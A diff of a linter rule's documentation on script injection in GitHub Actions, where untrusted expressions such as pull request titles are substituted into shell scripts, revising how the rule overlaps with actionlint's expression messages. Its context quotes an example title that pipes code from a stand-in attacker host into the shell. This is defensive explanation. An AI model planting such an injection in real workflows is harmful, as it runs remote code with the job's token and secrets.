@@ -17,10 +17,11 @@ The runner substitutes the expansion into the script text before the shell sees 
 substitution knows no shell syntax. A pull request title of `"; curl evil.example | sh; "` becomes
 a command in the job, which holds the job's token and secrets.
 
-This rule owns the hazard class of an untrusted expression reaching a script. The potentially
-untrusted `expression` messages of actionlint report the same hazard, and the lane drops them, so
-this is the one identifier a finding of it carries and the one an exception names. The type errors
-of the `expression` kind stay actionlint's.
+This rule is the owner of the hazard class of an untrusted expression reaching a script. The
+potentially untrusted `expression` messages of actionlint report the same hazard and are not
+dropped yet, because this audit at the regular persona does not report every expression they do (a
+`fromJSON` of an untrusted input is a pedantic-persona finding), so one expression can carry both
+identifiers until the persona is decided.
 
 ## Correct construction
 
